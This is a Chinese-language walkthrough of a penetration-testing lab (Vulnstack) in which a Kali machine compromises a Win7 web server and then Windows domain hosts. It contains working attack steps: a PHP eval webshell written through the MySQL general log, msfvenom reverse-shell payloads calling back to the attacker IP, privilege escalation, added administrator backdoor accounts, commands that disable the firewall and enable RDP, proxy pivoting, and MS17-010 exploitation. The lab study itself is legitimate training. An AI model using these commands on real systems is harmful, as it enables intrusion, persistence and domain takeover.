# 环境搭建

**靶机下载**

http://vulnstack.qiyuanxuetang.net/vuln/detail/2/

通过模拟真实环境搭建的漏洞靶场，完全模拟ATK&CK攻击链路进行搭建，形成完整个闭环。虚拟机默认密码为hongrisec@2019

可能win server的密码要改一下，然后win7的密码也会随着改变 

在vmware中给win7添加一个外网网卡

![image-20220521141706176](images/1.png)

![image-20220521141818584](images/2.png)

 WEB服务器：windows7系统

```armasm
外网网卡IP：192.168.121.136
内网网卡IP：192.168.52.143
ARMASM 复制 全屏
```

win7要手动去开一下phpstudy，就在c盘下

域成员：windows server 2003系统

```makefile
网卡IP:192.168.52.141
MAKEFILE 复制 全屏
```

域控服务器：windows server 2008系统

```armasm
网卡IP：192.168.52.138
```

攻击机器：kali 2020.2

```armasm
kali IP:192.168.121.129
```

实验环境拓扑：

![image-20220525145408393](images/3.png)

kali是攻击机，win7是对外的web机，win2003是内网机器（域成员），win2008是域控

# 信息收集

## 主机发现

```
arp-scan -l
```

![image-20220521142336547](images/4.png)

发现ip为192.168.121.136的靶机

## 端口服务

```
#下面随便一种都可以，但是最下面一种扫描得更加完全
nmap 192.168.121.136
nmap -sV 192.168.121.136
nmap -A -p- 192.168.121.136
nmap -Pn -A -T4 192.168.121.136
nmap -sC -v -n -sV -Pn -p 1-65535 192.168.121.136
```

![image-20220521143704448](images/5.png)

发现了80和3306端口开启

直接访问http，发现是一个phpstudy探针界面

![image-20220521143849004](images/6.png)

这个界面存在以下的问题

```
http明文传输
服务器指纹泄露（系统、Apache、PHP版本）
phpinfo信息泄露
mysql数据库弱口令
mysql数据库口令爆破
phpstudy后门（待检测）
```

![image-20220523133308203](images/7.png)

mysql这里用户名输root root居然检测到了连接成功

## 目录扫描

扫一扫后台

![image-20220523132438395](images/8.png)

看到了备份文件和phpmyadmin

下载备份文件看到yxcms，robot.txt也写了是YXCMS

访问http://192.168.121.136/yxcms/来到网站首页

刚才测试mysql的连接密码都是root，访问phpmyadmin也可以登陆

![image-20220523133632984](images/9.png)

# Getshell

## 方法一（后台任意文件写入）

之前扫到了yxcms，进入后看到网站首页泄露了后台登陆地址和账号密码

![image-20220525151150393](images/10.png)

http://192.168.121.136/yxcms/index.php?r=admin/进入后台登陆界面，账号admin，密码123456

利用yxcms 版本漏洞getshell。在“前台模板” 中看见自己可以编辑模板，模板通常可以自定义php文件，而且这里的php文件内容是可控的

![image-20220525152109016](images/11.png)

根据之前拿下来的备份文件可以看到这些模板保存在yxcms/protected/apps/default/view/default/路径下

![image-20220525151732715](images/12.png)

直接用蚁剑连接

![image-20220525152249877](images/13.png)

## 方法二（phpmyadmin日志getshell）

之前能够登陆phpmyadmin

![image-20220525152659610](images/14.png)

但是secure_file_priv为null，不能用select into outfile直接写入

```
第一步手动开启日志。
set global  general_log='on'   //首先设置为on
第二步 修改日志路径
set global  general_log_file ="C:\\phpstudy\\www\\shell.php"
第三步 查询一句话写入日志
Select '<?php eval($_POST[1]);?>'
```

![image-20220525153154274](images/15.png)



# 主机信息收集

```
网络配置信息	ipconfig /all

当前权限、账号信息	
whoami /all
net user XXX /domain

操作系统、软件版本信息	
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"
echo %PROCESSOR_ARCHITECTURE%
wmic product get name,version

本机服务信息	wmic service list brief
进程列表	tasklist /v 
wmic process list brief

启动程序信息	wmic startup get command,caption
计划任务	schtasks /query /fo LIST /v
主机开机时间	net statistics workstation

用户列表	
net user
net localgroup administrators
query user || qwinsta
客户端会话信息	net session
端口列表	netstat -ano
补丁列表	
Systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn 

查询本机共享	
net share
wmic share get name,path,status

路由、ARP 缓存表	route print、Arp –A

防火墙相关配置	netsh firewall show config
代理配置情况	reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
远程连接服务	Netstat -ano
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber

```

`whoami`一看是管理员账号

![image-20220525161749525](images/16.png)

`ipconfig/all`查看网卡

![image-20220525161934819](images/17.png)

![image-20220525161942959](images/18.png)

发现内网ip地址192.168.52.143和域god.org

`net config Workstation`查看当前计算机名称，全名，用户名，以及所在的工作站域等信息

![image-20220525162252698](images/19.png)

`net localgroup administrators`查看本地管理员，发现还有另一台用户

![image-20220525163606914](images/20.png)

`systeminfo`查看系统信息，可以确定当前域为`god.org`，域服务器名称为`OWA`，并且还打了四个补丁

![image-20220525165258864](images/21.png)

查看域信息

```
net group /domain  #查看域内所有用户列表
net group "domain computers" /domain #查看域成员计算机列表
net group "domain admins" /domain #查看域管理员用户
```

![image-20220525165441823](images/22.png)

这个域的域管理员是OWA，本机用户是STU1，还有另外两个用户DEV1和ROOT-TVI862UBEH

# 远程登陆

一般拿下window的话都会尝试去连接它的远程桌面，所以再查看一下3389端口开放情况

`netstat -an | find "3389"`,没有返回，说明没有开启，也可以直接用`netstar -an`看活动端口

手动去开启3389端口

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

如果要手动关闭的话则把上面的0换成1

![image-20220525170743290](images/23.png)

![image-20220525170750613](images/24.png)

可以看到3389已经开启

```
添加用户
net user Yokan !@#123qwe!@# /add # 添加账户密码
net localgroup administrators Yokan /add # 给Yokan账户添加为管理员权限
net user Yokan # 查询是否成功添加Yokan用户
```

![image-20220525170939139](images/25.png)

已经添加了Yokan账户，密码为`!@#123qwe!@#`

我用本机去连接

![image-20220525171147108](images/26.png)

这个时候防火墙是开启，我们需要关闭防火墙，防火墙开启了阻止所有与未在允许程序列表中的程序的连接，换句话说，设置了白名单，只能本地连接

```
关闭防火墙
netsh firewall set opmode disable   			#winsows server 2003 之前
netsh advfirewall set allprofiles state off 	#winsows server 2003 之后


或者让防火墙对3389端口放行
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

![image-20220525171716801](images/27.png)

关闭后可以连接，但是因为这里原先的账户已经登陆了，所以我用新的账户去登陆会注销原来的账户，所以这里为了方便我就用原来的god/Administrator登陆了，平常可以用这个添加的用户做一个权限维持

![image-20220525172104767](images/28.png)

连接成功

因为是练习所以多试几种方法

在防火墙未关闭的情况下可以这样

- 1.反弹一个msf的shell回来，尝试关闭防火墙
- 2.尝试使用隧道连接3389

## 反弹msf

由于win7启动了安全模式，所以无法直接反弹shell到kali上；
通过msf生成一个木马`msf.exe`到win7上（-f 输出格式，-o 输出地址）；
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.121.129 LPORT=2333 -f exe -o msf.exe`

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf > mshell.elf`

将生成的msf.exe通过蚁剑上传到win7上运行

使用`exploit/multi/handler`模块开启msf监听

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.121.129 (kali IP)
set lport 2333 (监听的端口)
run
```

接着`getuid`查看一下当前权限，然后`getsystem`提为system权限

![image-20220525180716791](images/29.png)

提权成功，但是并没有开启3389端口

![image-20220525180741795](images/30.png)

开启远程桌面`run post/windows/manage/enable_rdp`

![image-20220525181831312](images/31.png)

![image-20220525181859052](images/32.png)

远程连接桌面`rdesktop 192.168.121.136`

![image-20220525182329181](images/33.png)

## 使用隧道连接3389

这里需要去购买才能使用，可以参考https://www.cnblogs.com/yokan/p/14021537.html

# 抓取密码

直接用cs抓取密码，可以参考https://blog.csdn.net/qq_44874645/article/details/121332867

![image-20220525183802208](images/34.png)

# 进入内网

因为之间崩了一次，我win7的ip变为了192.168.121.137

## 内网信息收集

`run post/windows/gather/enum_applications`查看win7上安装了哪些软件

![image-20220526130939085](images/35.png)

arp -a查看arp缓存

![image-20220526131003229](images/36.png)

发现了内网机器192.168.52.141和192.168.52.138

之前信息收集的时候也发现了另外的域成员和域控

端口扫描就用nmap即可

### 漏洞扫描

对192.168.52.141进行扫描

![image-20220526131746301](images/37.png)

最后得到的结果

```
Nmap scan report for 192.168.52.141
Host is up (0.013s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
135/tcp  open  msrpc
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp  open  netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp  open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
777/tcp  open  multiling-http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
1025/tcp open  NFS-or-IIS
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
1038/tcp open  mtqp
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
1042/tcp open  afrog
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
1043/tcp open  boinc
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
6002/tcp open  X11:2
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
7001/tcp open  afs3-callback
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
7002/tcp open  afs3-prserver
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
8099/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:6D:39:34 (VMware)

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

```

对192.168.52.138扫描，扫描过程有点慢

扫描结果

```
[*] Tasked beacon to run: nmap --script=vuln 192.168.52.138
[+] host called home, sent: 64 bytes
[+] received output:
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-26 13:20 ?D1ú±ê×?ê±??

[+] received output:
Nmap scan report for 192.168.52.138
Host is up (0.00s latency).
Not shown: 983 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
88/tcp    open  kerberos-sec
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
389/tcp   open  ldap
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
445/tcp   open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
464/tcp   open  kpasswd5
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
593/tcp   open  http-rpc-epmap
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
636/tcp   open  ldapssl
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
3268/tcp  open  globalcatLDAP
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3269/tcp  open  globalcatLDAPssl
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
49154/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49155/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49157/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49158/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49167/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:3F:5D:A9 (VMware)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

```

发现两个都存在smb-vuln-ms17-010漏洞，且445端口的SMB服务开启的

## 横向移动

### 添加路由、挂socks4a代理

为了让MSF其他模块能访问内网的其他主机，即52网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递

添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务（添加路由一定要在挂代理之前，因为代理需要用到路由功能）

`run autoroute -s 192.168.52.0/24`添加录路由；
`run autoroute -p`查看路由；

![image-20220526132411338](images/38.png)

设置代理，方便访问内网服务；

```
 background #后台运行
 use auxiliary/server/socks4a
 set srvhost 192.168.121.129
 set srvport 1080
 run
```

![image-20220526132713721](images/39.png)

然后修改`/etc/proxychains.conf`的最后一行为`socks4 192.168.121.129 1080`

![image-20220526132825566](images/40.png)

`proxychains curl http://192.168.52.143/`试一试能否访问内网IP

![image-20220526132907686](images/41.png)

访问成功

这里因为win7前面发现有nmap了，我就直接那nmap扫的，但是这里挂上代理后也可以扫

```
use auxiliary/scanner/portscan/tcp
set rhosts 192.168.52.141
set threads 100
run
```

## 拿域成员和域控

前面扫到了两台主机都存在永恒之蓝漏洞，用同样的方式拿下，这里就只演示一台

```
use auxiliary/scanner/smb/smb_ms17_010
set rhost 192.168.52.141
run
```

![image-20220526135001539](images/42.png)

成功扫到

注意一下，msf内置的17-010打2003有时候多次执行后msf就接收不到session，而且ms17-010利用时，脆弱的server 2003非常容易蓝屏

所以利用auxiliary/admin/smb/ms17_010_command直接执行命令

```
use auxiliary/admin/smb/ms17_010_command
set rhosts 192.168.52.141
set command whoami
run
```

![image-20220526135057810](images/43.png)

`set command net user T0WN 8888! /add`添加用户；
`set command net localgroup administrators T0WN /add`添加管理员权限；
`set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'`执行命令开启3389端口，这里要么用单引号把命令引住，要么用反斜杠对反斜杠和引号进行转义，否则会出错

然后就可以远程登陆win2003了

`proxychains rdesktop 192.168.52.141`远程桌面

反弹shell

```
use exploit/windows/smb/ms17_010_psexec
set payload windows/meterpreter/bind_tcp
set rhosts 192.168.52.141
run
```

![image-20220526143701875](images/44.png)

其他的就和win7主机一样了，对于DC也是这样



# 写在最后

这里的靶机实验思路总结：

通过外网web服务的漏洞拿到shell，通过msf反弹shell和cs上线，可以抓取密码和远程连接桌面，最后通过一系列信息收集发现内网，通过添加路由，设置代理来访问内网资源（主要是msf的利用），再对内网机器进行信息收集发现445端口的SMB服务，并且可以利用永恒之蓝，最后拿下域成员和域控制器

这里有篇文章我看到他后面基本上都是用cs去拿下的域控和域成员https://blog.csdn.net/weixin_44288604/article/details/108172737

因为是第一次做这种渗透学习，基本上就是根据各位师傅的博客来一步一步实现的，学习了很多之前不知道的东西，对这方面的学习有了新的认识，主要是思路和msf还有cs的利用



参考链接

https://www.cnblogs.com/yokan/p/14021537.html

https://blog.csdn.net/qq_44874645/article/details/121332867

http://1.15.187.227/index.php/archives/636/

https://www.cnblogs.com/yokan/p/14021537.html

https://www.yuque.com/yvr9kt/gdp94e/9ae5c0688b17c1a71c6f96c8c9f6bbb2

https://blog.csdn.net/weixin_42918771/article/details/116165145

https://blog.csdn.net/weixin_44288604/article/details/108172737
